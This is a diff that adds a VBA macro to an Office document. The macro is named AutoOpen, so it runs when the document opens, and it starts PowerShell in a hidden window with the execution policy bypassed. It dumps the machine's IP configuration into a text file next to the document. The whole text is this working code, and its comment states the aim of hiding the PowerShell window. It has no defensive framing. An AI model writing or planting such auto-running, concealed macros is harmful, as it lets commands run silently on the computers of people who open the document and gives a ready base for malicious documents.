@@ -1,0 +1,12 @@
+'Grabs the ip address from powershell and stores it into a file within the same directory, all while hiding the powershell window
+Sub AutoOpen()
+    Dim shell As Object
+    Dim docPath As String
+    Dim Command As String
+    
+    docPath = ThisDocument.path & "\ip.txt"
+    Set shell = CreateObject("WScript.Shell")
+    Command = "cmd.exe /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command ""Get-NetIPAddress | Out-File -FilePath '" & docPath & "'"""
+    shell.Run Command, 0, False
+    
+End Sub
